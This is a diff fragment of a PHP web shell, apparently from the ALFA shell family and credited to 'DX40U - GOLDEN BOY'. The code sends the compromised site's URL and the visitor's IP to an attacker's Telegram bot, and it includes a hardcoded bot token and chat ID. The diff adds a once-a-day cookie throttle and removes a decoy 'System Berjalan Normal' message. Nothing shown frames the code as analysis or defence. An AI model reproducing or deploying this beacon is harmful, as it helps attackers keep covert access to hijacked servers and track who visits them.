@@ -5,35 +5,38 @@ Author:  DX40U - GOLDEN BOY
 $botToken = "8652693265:AAFtpb8DO7bksGLFQlitbvPwvCLb-KQ8rN0";
 $chatId   = "8740437616";
 
-$domain   = $_SERVER['HTTP_HOST'];
-$path     = $_SERVER['REQUEST_URI'];
-$ip_addr  = $_SERVER['REMOTE_ADDR']; 
-$full_url = "http://" . $domain . $path;
+$url_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
 
+if (!isset($_COOKIE['sent_' . $url_hash])) {
+    
+    $domain   = $_SERVER['HTTP_HOST'];
+    $path     = $_SERVER['REQUEST_URI'];
+    $ip_addr  = $_SERVER['REMOTE_ADDR']; 
+    $full_url = "http://" . $domain . $path;
 
-$message  = "📢 *Shell Akses Terdeteksi!*\n";
-$message .= "🌐 *URL:* " . $full_url . "\n";
-$message .= "📍 *IP Pengakses:* " . $ip_addr . "\n";
-$message .= "⏰ *Waktu:* " . date("Y-m-d H:i:s");
+    $message  = "📢 **Whiskas Dapat Akses**\n";
+    $message .= "🌐 *URL:* " . $full_url . "\n";
+    $message .= "📍 *IP:* " . $ip_addr . "\n";
+    $message .= "⏰ *Waktu:* " . date("Y-m-d H:i:s");
 
-$url = "https://api.telegram.org/bot$botToken/sendMessage";
-$post_fields = [
-    'chat_id'   => $chatId,
-    'text'      => $message,
-    'parse_mode' => 'Markdown'
-];
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $post_fields = [
+        'chat_id'   => $chatId,
+        'text'      => $message,
+        'parse_mode' => 'Markdown'
+    ];
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_exec($ch);
+    curl_close($ch);
 
-$result = curl_exec($ch);
-curl_close($ch);
-
-echo "System Berjalan Normal.";
+    setcookie('sent_' . $url_hash, 'true', time() + 86400, '/');
+}
 
 $GLOBALS['oZgNypoPRU'] = array(
 'username' => 'alfa',
